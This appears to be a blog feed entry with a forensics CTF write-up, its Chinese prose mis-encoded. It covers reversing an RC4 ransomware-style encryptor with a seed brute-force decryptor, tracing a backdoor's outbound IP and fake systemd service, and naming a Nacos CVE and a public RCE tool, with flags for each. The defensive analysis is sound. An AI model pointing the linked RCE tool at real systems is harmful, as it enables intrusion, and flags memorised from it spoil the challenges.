    <content type="html"><![CDATA[<p>æ¯”èµ› + èµ›åå¤ç°çš„é¢˜è§£</p><span id="more"></span><h1 id="ã€ç­¾åˆ°ã€‘å’Œé»‘å®¢å»BattleæŠŠï¼"><a href="#ã€ç­¾åˆ°ã€‘å’Œé»‘å®¢å»BattleæŠŠï¼" class="headerlink" title="ã€ç­¾åˆ°ã€‘å’Œé»‘å®¢å»BattleæŠŠï¼"></a>ã€ç­¾åˆ°ã€‘å’Œé»‘å®¢å»BattleæŠŠï¼</h1><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">é¢˜ç›®æè¿°<br>æŸæŸæ–‡åŒ–æœ‰é™å…¬å¸è¢«åŠ å¯†å•¦ï¼è€æ¿ç»™äº†å°ç‹<span class="hljs-number">5000</span>ç¾å…ƒè¯·ä½ å¸®åŠ©å°ç‹å’Œé»‘å®¢è°ˆåˆ¤äº‰å–ä½¿ç”¨æœ€ä½çš„ä»·æ ¼ä¹°ä¸‹å¯†é’¥ï¼<br>ã€ç”¨æˆ·IDä¸ºç™»å½•é’å°‘å¹´<span class="hljs-built_in">CTF</span>å¹³å°çš„æ‰‹æœºå·ã€‘<br>ã€æœ¬é¢˜ä¸ºæ¨¡æ‹Ÿè¯·å‹¿å½“çœŸï¼ç¦æ­¢æ”»å‡»å¹³å°ï¼ã€‘<br></code></pre></td></tr></table></figure><p>æ‰“å¼€ README.txtï¼Œæ‰¾åˆ°äº† ID å’Œç½‘å€ï¼š<a href="https://www.phantomhand.top/">https://www.phantomhand.top/</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/aa976af1355045f2.png"></p><p>ID å’Œæ‰‹æœºå·ç™»å½•ï¼Œä¸€ç›´è·Ÿå®ƒè®¨ä»·è¿˜ä»·ï¼Œç›´åˆ°å®ƒæ¥å— 5000 USDTï¼Œç„¶åç­”åº”å°±æ‹¿åˆ° flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/1f5e89e3882d4b2e.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;H7Q44S85842W6TQZPERS72ED&#125;</span><br></code></pre></td></tr></table></figure><h1 id="çªƒå¯†æ’æŸ¥-1"><a href="#çªƒå¯†æ’æŸ¥-1" class="headerlink" title="çªƒå¯†æ’æŸ¥-1"></a>çªƒå¯†æ’æŸ¥-1</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">é¢˜ç›®æè¿°<br>å‘ç°å†…éƒ¨æ•°æ®è¢«çªƒå–ï¼Œè¿›è¡Œç´§æ€¥ä¸Šæœºã€‚è¯·é€šè¿‡é»‘å®¢é—ç•™ç—•è¿¹è¿›è¡Œæ’æŸ¥ï¼š<br>æ‰¾åˆ°é»‘å®¢çªƒå¯†å·¥å…·çš„è´¦å·<br></code></pre></td></tr></table></figure><p>æŠŠç›®å½•ç¿»éï¼Œåœ¨ <code>/tmp</code> ç›®å½•ä¸‹æ‰¾åˆ°äº† mega æœåŠ¡ï¼Œroot è¿è¡Œ</p><p><img src="https://img.dkdun.cn/v1/2025/12/f160096680cfd7fe.png"></p><p>è¿›å…¥ <code>/root</code> ç›®å½•æ‰¾åˆ°éšè—æ–‡ä»¶å¤¹</p><p><img src="https://img.dkdun.cn/v1/2025/12/97b4d8ad9f63a471.png"></p><p>æŸ¥çœ‹ç›®å½•ä¸‹çš„  <code>megacmdserver.log</code> æ—¥å¿—æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/4a4c3443940619c1.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">26</span>_03-<span class="hljs-number">51</span>-<span class="hljs-number">59</span>.<span class="hljs-number">862963</span> cmd INFO Login complete as <span class="hljs-number">25</span>solar3abc@habenwir.com<span class="hljs-meta"> [megacmdexecuter.cpp:2721]</span><br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°è´¦å· <code>25solar3abc@habenwir.com</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">flag&#123;<span class="hljs-symbol">25solar3abc@</span>habenwir.com&#125;<br></code></pre></td></tr></table></figure><h1 id="2503é€†å‘"><a href="#2503é€†å‘" class="headerlink" title="2503é€†å‘"></a>2503é€†å‘</h1><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">é¢˜ç›®æè¿°<br>é‡è¦æ–‡ä»¶è¢«åŠ å¯†äº†ï¼Œè¯·åˆ†æåŠ å¯†å™¨è§£å¼€è¯¥æ–‡ä»¶ã€‚<br>æç¤ºï¼šåŠ å¯†å‰çš„æ–‡ä»¶å‰å››ä¸ªå­—èŠ‚ä¸º<span class="hljs-built_in">flag</span>ï¼Œä¸”å¼€æœºæ—¶é—´è¾ƒçŸ­<br></code></pre></td></tr></table></figure><p>64 ä½å¯æ‰§è¡Œæ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/5a862ddcd39f4ad0.png"></p><p>shift+f12 æœç´¢å­—ç¬¦ä¸²ï¼Œç„¶åä»å­—ç¬¦ä¸²å®šä½åˆ° main å‡½æ•°</p><p><img src="https://img.dkdun.cn/v1/2025/12/59f81bc93c41181e.png"></p><p>å¤§æ¦‚æµç¨‹ï¼šè¯»å–æ˜æ–‡æ–‡ä»¶ <code>flag.txt</code>ï¼Œç”¨ <code>GetTickCount()</code> ä½œä¸º <code>srand</code> ç§å­ï¼Œç”Ÿæˆ16å­—èŠ‚éšæœºå¯†é’¥ï¼Œå­—ç¬¦éƒ½æ¥è‡ª <code>v14</code> è¿™ä¸ªå­—ç¬¦é›†ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„ <code>qa0wserdf1tg9yuhjio2pklz8xbvcn4mPL7JKOIHUG3YTF6DSREAWQZX5MNCBV</code> è¿™ä¸²å­—ç¬¦ï¼Œç„¶åè°ƒç”¨ <code>sub_140001350</code> å‡½æ•°è¿›è¡ŒåŠ å¯†å¾—åˆ° <code>flag.txt.freefix</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/f41eed6e17fa4774.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/636739aa175da7da.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/adcdc0d9341acbf9.png"></p><p><code>sub_140001350</code> æ˜¯æ ‡å‡†çš„ RC4 ç®—æ³•ï¼ŒåŒ…å« KSA å’Œ PRGA é˜¶æ®µ</p><p><img src="https://img.dkdun.cn/v1/2025/12/86bd2eb3f1d0b7a8.png"></p><p>010 æ‰“å¼€åŠ å¯†æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/d12b6b43876a1465.png"></p><p>æå–åŠ å¯†åæ–‡ä»¶æ•°æ®</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4C</span> <span class="hljs-number">00</span> <span class="hljs-number">2</span>F AD <span class="hljs-number">84</span> <span class="hljs-number">10</span> <span class="hljs-number">58</span> AC <span class="hljs-number">8</span>D D1 <span class="hljs-number">59</span> <span class="hljs-number">69</span> <span class="hljs-number">79</span> FB <span class="hljs-number">9</span>D B5 C5 FA <span class="hljs-number">60</span> <span class="hljs-number">17</span> B0 <span class="hljs-number">46</span> E8 <span class="hljs-number">75</span> D6 CD DE D7 <span class="hljs-number">57</span> DC <span class="hljs-number">7</span>C <span class="hljs-number">96</span> E1 <span class="hljs-number">15</span> F3 BD C0 <span class="hljs-number">72</span> <span class="hljs-number">98</span> <span class="hljs-number">91</span> <span class="hljs-number">88</span> <span class="hljs-number">4</span>D <span class="hljs-number">0</span>C BA <span class="hljs-number">66</span> <span class="hljs-number">04</span> C9<br></code></pre></td></tr></table></figure><p>æ‹·é—® deepseek èƒ½å‡ºï¼Œçˆ†ç ´ç§å­ï¼Œpoc å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><span class="hljs-comment"># å­—ç¬¦æ± ï¼ˆä¸C++ä»£ç ä¸€è‡´ï¼‰</span><br>CHAR_POOL = <span class="hljs-string">&quot;qa0wserdf1tg9yuhjio2pklz8xbvcn4mPL7JKOIHUG3YTF6DSREAWQZX5MNCBV&quot;</span><br><br><span class="hljs-comment"># åŠ å¯†åçš„æ•°æ®ï¼ˆæ›¿æ¢ä¸ºä½ çš„å®é™…å¯†æ–‡ï¼‰</span><br>CIPHER_HEX = <span class="hljs-string">&quot;4C002FAD841058AC8DD1596979FB9DB5C5FA6017B046E875D6CDDED757DC7C96E115F3BDC0729891884D0CBA6604C9&quot;</span><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(CIPHER_HEX)<br><br><span class="hljs-comment"># -------------------------------</span><br><span class="hljs-comment"># ç²¾ç¡®æ¨¡æ‹ŸC++çš„éšæœºæ•°ç”Ÿæˆå™¨</span><br><span class="hljs-comment"># -------------------------------</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MSVCRand</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, seed</span>):<br>        <span class="hljs-variable language_">self</span>.state = seed<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.state = (<span class="hljs-variable language_">self</span>.state * <span class="hljs-number">214013</span> + <span class="hljs-number">2531011</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">self</span>.state &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x7FFF</span>  <span class="hljs-comment"># ä¿ç•™ä½15ä½</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_key</span>(<span class="hljs-params">seed</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;ç”Ÿæˆ16å­—èŠ‚å¯†é’¥ï¼ˆä¸¥æ ¼åŒ¹é…C++é€»è¾‘ï¼‰&quot;&quot;&quot;</span><br>    rng = MSVCRand(seed)<br>    key = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        index = rng.rand() % <span class="hljs-number">62</span>  <span class="hljs-comment"># 62ä¸ªå­—ç¬¦</span><br>        key.append(CHAR_POOL[index])<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(key)<br><br><span class="hljs-comment"># -------------------------------</span><br><span class="hljs-comment"># RC4è§£å¯†å‡½æ•°ï¼ˆä¸sub_140001350ä¸¥æ ¼ä¸€è‡´ï¼‰</span><br><span class="hljs-comment"># -------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    <span class="hljs-comment"># åˆå§‹åŒ–Sç›’</span><br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    key_bytes = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> key]<br>    key_len = <span class="hljs-built_in">len</span>(key_bytes)<br><br>    <span class="hljs-comment"># KSAé˜¶æ®µ</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key_bytes[i % key_len]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    <span class="hljs-comment"># PRGAé˜¶æ®µ</span><br>    i = j = <span class="hljs-number">0</span><br>    plaintext = []<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> ciphertext:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        plaintext.append(byte ^ k)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(plaintext)<br><br><span class="hljs-comment"># -------------------------------</span><br><span class="hljs-comment"># å¤šçº¿ç¨‹æš´åŠ›ç ´è§£ï¼ˆä¿æŒ0-10,000,000èŒƒå›´ï¼‰</span><br><span class="hljs-comment"># -------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">seed</span>):<br>    key = generate_key(seed)<br>    plaintext = rc4_decrypt(ciphertext, key)<br>    <span class="hljs-comment"># ä¸¥æ ¼æ£€æµ‹flagæ ¼å¼ï¼ˆå‡å°‘è¯¯æŠ¥ï¼‰</span><br>    <span class="hljs-keyword">if</span> plaintext.startswith(<span class="hljs-string">b&#x27;flag&#123;&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">b&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> plaintext:<br>        <span class="hljs-keyword">return</span> seed, key, plaintext.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] æ­£åœ¨ç ´è§£ç§å­èŒƒå›´: 0 - 10,000,000&quot;</span>)<br><br>    <span class="hljs-comment"># å¤šçº¿ç¨‹åŠ é€Ÿï¼ˆæ ¹æ®CPUè°ƒæ•´çº¿ç¨‹æ•°ï¼‰</span><br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">8</span>) <span class="hljs-keyword">as</span> executor:<br>        chunk_size = <span class="hljs-number">100000</span>  <span class="hljs-comment"># æ¯10ä¸‡æ¬¡ä¸ºä¸€ç»„</span><br>        total = <span class="hljs-number">10_000_000</span><br>        found = <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> base <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, total, chunk_size):<br>            chunk_start = base<br>            chunk_end = <span class="hljs-built_in">min</span>(base + chunk_size, total)<br>            <br>            <span class="hljs-comment"># æäº¤ä»»åŠ¡</span><br>            futures = [executor.submit(worker, seed) <span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(chunk_start, chunk_end)]<br>            <br>            <span class="hljs-comment"># æ£€æŸ¥ç»“æœ</span><br>            <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> futures:<br>                result = future.result()<br>                <span class="hljs-keyword">if</span> result:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] è§£å¯†æˆåŠŸï¼ç§å­: <span class="hljs-subst">&#123;result[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] ä½¿ç”¨çš„å¯†é’¥: <span class="hljs-subst">&#123;result[<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Flagå†…å®¹: <span class="hljs-subst">&#123;result[<span class="hljs-number">2</span>]&#125;</span>&quot;</span>)<br>                    found = <span class="hljs-literal">True</span><br>                    executor.shutdown(wait=<span class="hljs-literal">False</span>)<br>                    sys.exit(<span class="hljs-number">0</span>)<br>            <br>            <span class="hljs-comment"># è¿›åº¦æ˜¾ç¤º</span><br>            progress = (chunk_end / total) * <span class="hljs-number">100</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\rè¿›åº¦: <span class="hljs-subst">&#123;chunk_end:,&#125;</span>/<span class="hljs-subst">&#123;total:,&#125;</span> (<span class="hljs-subst">&#123;progress:<span class="hljs-number">.2</span>f&#125;</span>%)&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>, flush=<span class="hljs-literal">True</span>)<br>            <br>            <span class="hljs-keyword">if</span> found:<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[-] æœªåœ¨æŒ‡å®šèŒƒå›´å†…æ‰¾åˆ°æœ‰æ•ˆç§å­ï¼Œå»ºè®®ï¼š&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  1. æ£€æŸ¥å¯†æ–‡æ˜¯å¦æ­£ç¡®&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  2. æ‰©å¤§ç§å­èŒƒå›´ï¼ˆå‚è§ä¹‹å‰çš„7å¤©èŒƒå›´æ–¹æ¡ˆï¼‰&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/70ad60496b1defb9.png"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">flag&#123;hello_www.sierting.com_fodhaoijsa<span class="hljs-number">08324082</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="æº¯æºæ’æŸ¥-1"><a href="#æº¯æºæ’æŸ¥-1" class="headerlink" title="æº¯æºæ’æŸ¥-1"></a>æº¯æºæ’æŸ¥-1</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">é¢˜ç›®æè¿°<br>æŸä¼ä¸šçš„é˜¿é‡Œäº‘æœåŠ¡å™¨ï¼Œç°å·²å°†é•œåƒä»é˜¿é‡Œäº‘ä¸‹è½½ä¸‹æ¥ï¼Œè¯¥æœåŠ¡å™¨å­˜åœ¨å¥‡æ€ªçš„å¤–è¿ï¼Œè¯·æ’æŸ¥å‡ºå¤–è¿åœ°å€<br></code></pre></td></tr></table></figure><p>æŠŠ raw è½¬æˆ vmdk å†å¯¼å…¥ VMï¼Œç„¶åç™»å½•å¯¹ eth0 æŠ“åŒ…ï¼Œç›‘æ§é SSH çš„æµé‡</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> -i eth0 not port <span class="hljs-number">22</span> -nn<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/e16ec3caaa647fd9.png"></p><p>å‘ç°äº†å¯¹åŒä¸€ä¸ª IP è¯·æ±‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">156.238.230.167:46578</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="æº¯æºæ’æŸ¥-2"><a href="#æº¯æºæ’æŸ¥-2" class="headerlink" title="æº¯æºæ’æŸ¥-2"></a>æº¯æºæ’æŸ¥-2</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">é¢˜ç›®æè¿°<br>æ’æŸ¥å¤–è¿è¿›ç¨‹ç¨‹åºçš„ç»å¯¹è·¯å¾„<br></code></pre></td></tr></table></figure><p><code>systemctl status</code> æŸ¥çœ‹æœåŠ¡å‘ç°åŒæ—¶æœ‰ä¸¤ä¸ªç›¸ä¼¼æœåŠ¡ï¼Œ <code>systemd-journald</code> ç”¨äºæ—¥å¿—ç®¡ç†ï¼Œå¦ä¸€ä¸ª <code>journaled</code> æ˜¯ä¼ªé€ æˆç³»ç»Ÿè¿›ç¨‹çš„å¤–è¿è¿›ç¨‹</p><p><img src="https://img.dkdun.cn/v1/2025/12/d37f87ad30f90a7e.png"></p><p>åŒæ—¶ä¹Ÿå¯ä»¥ç”¨ top å‘½ä»¤ç›‘æ§ç³»ç»Ÿè¿›ç¨‹èµ„æº</p><p><img src="https://img.dkdun.cn/v1/2025/12/35767736f496ff40.png"></p><p>ç„¶åæŸ¥æ‰¾ä½ç½®</p><p><img src="https://img.dkdun.cn/v1/2025/12/92f56b17131aafb4.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">flag&#123;<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/systemd/</span>journaled&#125;<br></code></pre></td></tr></table></figure><h1 id="æº¯æºæ’æŸ¥-3"><a href="#æº¯æºæ’æŸ¥-3" class="headerlink" title="æº¯æºæ’æŸ¥-3"></a>æº¯æºæ’æŸ¥-3</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">é¢˜ç›®æè¿°<br>æ’æŸ¥åé—¨ï¼Œæäº¤å…¶å®Œæ•´åç§°<br></code></pre></td></tr></table></figure><p>R-Studio æŒ‚è½½è¿›å…¥ä¸Šé¢çš„ç›®å½•</p><p><img src="https://img.dkdun.cn/v1/2025/12/c658928f87467db7.png"></p><p>å¯ä»¥é“¾æ¥åˆ° <code>/tmp/tmp/hsperfdata_root</code> å†…çš„ä¸¤ä¸ªè¢«åˆ é™¤çš„æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/2b49097be9a7f169.png"></p><p>åœ¨ <code>/etc/systemd/system</code> ä¸‹å¯ä»¥æ‰¾åˆ°è¿™ä¸ªæœåŠ¡ï¼Œå°±æ˜¯è¿™ä¸ªæœåŠ¡åç§°</p><p><img src="https://img.dkdun.cn/v1/2025/12/b489a605e4460f27.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;systemd-journaled&#125;</span><br></code></pre></td></tr></table></figure><h1 id="æº¯æºæ’æŸ¥-4"><a href="#æº¯æºæ’æŸ¥-4" class="headerlink" title="æº¯æºæ’æŸ¥-4"></a>æº¯æºæ’æŸ¥-4</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">é¢˜ç›®æè¿°<br>ä¸šåŠ¡ç³»ç»Ÿå·²è¢«åˆ é™¤ï¼Œæ‰¾å‡ºå¯èƒ½å­˜åœ¨æ¼æ´çš„åº”ç”¨<br></code></pre></td></tr></table></figure><p>å‘ç°æœ‰ nacos </p><p><img src="https://img.dkdun.cn/v1/2025/12/791bc4c2860ece86.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;nacos&#125;</span><br></code></pre></td></tr></table></figure><h1 id="æº¯æºæ’æŸ¥-5"><a href="#æº¯æºæ’æŸ¥-5" class="headerlink" title="æº¯æºæ’æŸ¥-5"></a>æº¯æºæ’æŸ¥-5</h1><p><a href="https://blog.csdn.net/qq_55202378/article/details/141287014">Nacoså†å²æ¼æ´å¤ç°ï¼ˆæ±‡æ€»ï¼‰</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/0328eb1fbe3d1493.png"></p><p>ä½†æ˜¯è¿™ä¸æ˜¯ CNVD å—ï¼Ÿï¼Ÿï¼Ÿ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">45001</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="æº¯æºæ’æŸ¥-6"><a href="#æº¯æºæ’æŸ¥-6" class="headerlink" title="æº¯æºæ’æŸ¥-6"></a>æº¯æºæ’æŸ¥-6</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">é¢˜ç›®æè¿°<br>æ‰¾å‡ºé»‘å®¢åˆ©ç”¨æ¼æ´ä½¿ç”¨çš„å·¥å…·çš„åœ°å€ï¼Œè¯¥å·¥å…·ä¸ºå¼€æºå·¥å…·<br></code></pre></td></tr></table></figure><p>ç›´æ¥æœ <code>nacosrce</code> æ‰¾åˆ°äº†å·¥å…·</p><p><img src="https://img.dkdun.cn/v1/2025/12/b3b352a56b747540.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">flag&#123;https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/c0olw/</span>NacosRce&#125;<br></code></pre></td></tr></table></figure><h1 id="å…³äºä»¿çœŸ"><a href="#å…³äºä»¿çœŸ" class="headerlink" title="å…³äºä»¿çœŸ"></a>å…³äºä»¿çœŸ</h1><p>å‚è€ƒçš„ n0o0b å¸ˆå‚…çš„æ–‡ç« ï¼š<a href="https://www.n0o0b.com/archives/solar-3#%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5-1">https://www.n0o0b.com/archives/solar-3#%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5-1</a> å†™å¾—å¾ˆè¯¦ç»†</p>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025 æ•°å­—ä¸­å›½æ•°æ®å®‰å…¨äº§ä¸šç§¯åˆ†äº‰å¤ºèµ›åˆèµ›-è¥¿åŒºéƒ¨åˆ†é¢˜è§£(å›¢é˜Ÿ)</title>
    <link href="/2025/03/30/2025-%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B-%E8%A5%BF%E5%8C%BA%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
